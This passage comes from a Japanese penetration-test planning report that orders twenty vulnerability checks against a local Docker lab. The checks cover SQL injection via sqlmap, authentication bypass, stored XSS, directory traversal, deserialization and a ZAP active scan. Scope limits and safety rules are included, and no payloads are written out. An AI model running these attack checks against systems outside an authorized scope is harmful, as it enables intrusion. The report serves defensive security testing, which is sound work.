- ソースコードやスキャン結果から脆弱性の存在が明白
- 実際の攻撃を行わなくても影響範囲とリスクが評価可能
- 工程6では報告書に記載するのみ

---

### 3.2 誤検知の可能性が高い項目

| # | 検出内容 | 脆弱性ID | ツール | 除外理由 |
|---|---------|---------|--------|---------|
| 1 | **CVE-2011-3192 (Apache Byterange DoS)** | CONFIG-08 | Nmap vuln script | 対象はnginx 1.29.5（Apache固有の脆弱性は該当しない）<br/>Nmapの誤検知と判断 |

**検証不要の理由**: 
- Apache固有の脆弱性だが、環境はnginxを使用
- Nmapの脆弱性検出スクリプトの誤判定と考えられる
- 実際にByterangeリクエストを送信してもDoSは発生しない可能性が高い

---

### 3.3 工程外項目（設定レビューで対応）

| # | 項目 | 脆弱性ID | 理由 |
|---|------|---------|------|
| 1 | **秘匿情報のログ出力** | INFRA-04 | ブラウザコンソールのログ出力確認（フロントエンドE2Eテストで確認可能） |
| 2 | **AllowedHosts ワイルドカード** | CONFIG-07 | ホストヘッダインジェクション攻撃は複雑なため、設定レビューで対応 |

---

## 4. 検証実施順序

検証は以下の順序で実施することを推奨します：

### Phase 1: インフラ・ネットワーク層（即座に実行可能）

1. **V-14: データベースポート外部公開** - 最も簡単で影響が大きい
2. **V-20: SSL/TLS未使用** - ソースコード確認のみ
3. **V-15: セキュリティヘッダーの欠如** - curlで即確認可能
4. **V-16: サーバーバージョン情報漏洩** - curlで即確認可能

### Phase 2: 認証・認可（Critical）

5. **V-05: SQLインジェクション - ログイン認証バイパス** - 最も危険
6. **V-06: 認証バイパス - DELETE操作** - 簡単に検証可能
7. **V-07: Mass Assignment - 権限昇格** - 簡単に検証可能
8. **V-19: レート制限の欠如** - ブルートフォース検証

### Phase 3: インジェクション攻撃（Critical）

9. **V-01: SQLインジェクション - ユーザー検索** - sqlmap自動化
10. **V-02: SQLインジェクション - ユーザー詳細** - sqlmap自動化
11. **V-03: SQLインジェクション - ユーザー作成** - sqlmap自動化
12. **V-04: SQLインジェクション - ユーザー更新** - sqlmap自動化
13. **V-08: Stored XSS** - curlでペイロード注入 + ブラウザ確認
14. **V-11: HTTPヘッダインジェクション** - curlで検証

### Phase 4: ファイル・データ操作（Critical）

15. **V-09: ディレクトリトラバーサル** - curlで即検証可能
16. **V-10: 安全でないデシリアライズ（RCE）** - ソースコード確認 + 安全なペイロードのみ
17. **V-17: 詳細エラー情報の露出** - curlで即確認可能

### Phase 5: その他の設定ミス

18. **V-12: Open Redirect** - curlまたはブラウザ確認
19. **V-13: CORS設定の不備** - curlで即確認可能

### Phase 6: 包括的スキャン（最終確認）

20. **V-18: OWASP ZAP アクティブスキャン** - すべての手動検証完了後に実行

**理由**:
- Phase 1-5で個別の脆弱性を確実に検証
- Phase 6のZAPスキャンで見逃しがないか最終確認
- ZAPスキャンの結果と手動検証の結果を照合し、報告書の信頼性を高める

---

## 5. 検証時の重要な注意事項

### 5.1 安全な検証環境

- ✅ すべての検証はローカルDockerネットワーク内で実施
- ✅ 対象: `frontend:80`, `api:5000`, `db:5432` のみ
- ❌ **外部サイト・外部APIへの攻撃は絶対に禁止**
- ❌ **本番環境・ステージング環境への検証は禁止**

### 5.2 データの取り扱い

- 検証で取得したデータ（パスワード、認証情報等）は検証後に適切に削除
- スクリーンショットやログに機密情報が含まれる場合はマスキング処理

### 5.3 RCE脆弱性の検証制限

- **V-10（安全でないデシリアライズ）** は実際のRCEペイロード実行は禁止
- ソースコード確認（`TypeNameHandling.All`）で脆弱性の存在を判定
- 無害なペイロード（`System.Version`等）のみ使用可能

### 5.4 DoS攻撃の禁止

- CVE-2011-3192（Byterange DoS）は検証対象外（誤検知のため）
- V-19（レート制限の欠如）は100回程度の試行に留める
- 実際のDoS攻撃（無限ループ、大量リクエスト）は禁止

### 5.5 非インタラクティブ実行

- すべての検証コマンドはヘッドレス・非インタラクティブで実行可能
- ブラウザ確認が必要な項目（V-08, V-12）はPlaywright自動化またはスクリーンショット取得
- ユーザー入力を求めるコマンドは使用しない（`--batch`, `-y`, `--non-interactive` フラグを使用）

---

## 6. 期待される成果物

### 6.1 検証レポート（工程6で作成）

- `/docker-work-dir/docs/reports/06-検証結果.md`
- 各検証項目（V-01〜V-20）の結果
  - 実行コマンド
  - 実行ログ（抜粋）
  - スクリーンショット（必要に応じて）
  - 判定結果（脆弱性あり/なし）
  - CVSSスコアの最終評価

### 6.2 証跡ファイル

- `/reports/sqlmap/v01/*` - sqlmap実行結果
- `/reports/zap-active/*` - ZAPアクティブスキャン結果
- `/reports/verification/*` - その他の検証ログ
- `/reports/screenshots/*` - スクリーンショット（XSS, Open Redirect等）

### 6.3 検証項目チェックリスト更新

- `/docker-work-dir/docs/進捗/検証項目チェックリスト.md`
- 各検証項目の完了状態を更新
- 脆弱性の有無を記録

---

## 7. ZAPアクティブスキャンについて

### 実行方法

検証項目に **V-18: OWASP ZAP アクティブスキャン** が含まれているため、工程6の開始前に以下が自動実行されます：

1. **オーケストレーターが `zap-active-orchestrator` を呼び出し**
2. **Playwright E2Eテストの実行**（ZAP Proxy経由）
   - ログイン
   - ユーザー一覧表示
   - ユーザー作成
   - ユーザー編集
   - ユーザー削除
   - 検索機能
3. **ZAP Proxy経由で全HTTP通信を記録**
4. **収集したURLに対してアクティブスキャン実行**
5. **レポート生成**（`/reports/zap-active/`）

### 期待される検出項目

- XSS（V-08で手動検証した内容と同じ）
- SQLインジェクション（V-01〜V-05と同じ）
- CSRF
- セキュリティヘッダー不足（V-15と同じ）
- その他OWASP Top 10項目

### レポートの活用

- ZAPレポートと手動検証結果を照合
- 手動検証で見つけた脆弱性がZAPでも検出されるか確認
- ZAPで新たに発見された脆弱性を追加検証

---

## 8. まとめ

### 検証対象の優先度

| 優先度 | 検証項目数 | 主な内容 |
|-------|-----------|---------|
| **P0 (Critical - 即座実行)** | 8 | V-05, V-06, V-14, V-01, V-02 等（認証バイパス、SQLi、DB公開） |
| **P1 (High - 早急実行)** | 6 | V-07, V-08, V-09, V-10 等（権限昇格、XSS、ディレクトリトラバーサル、RCE） |
| **P2 (Medium - 通常実行)** | 6 | V-11, V-12, V-13, V-15, V-17, V-19 等（ヘッダインジェクション、CORS、ヘッダー不足） |

### 検証完了までの推定所要時間

- **Phase 1-2**: 30分（インフラ・認証）
- **Phase 3**: 1時間（SQLインジェクション、XSS）
- **Phase 4**: 30分（ディレクトリトラバーサル、エラー露出）
- **Phase 5**: 20分（CORS、Open Redirect等）
- **Phase 6**: 45分（ZAPアクティブスキャン）
- **合計**: 約3時間15分

### 次工程への移行条件

以下の条件を満たした場合、工程6（検証フェーズ）へ移行可能：

- ✅ 全20件の検証項目の手順が明確
- ✅ 各検証項目のコマンドがコピペで実行可能
- ✅ 判定基準が明確
- ✅ 検証項目チェックリストが作成済み
- ✅ ZAPアクティブスキャンの実行準備完了

---

**検証項目決定完了**

次工程（工程6: 検証フェーズ）では、本レポートで定義した20件の検証項目を実際に実行し、脆弱性の存在を実証します。
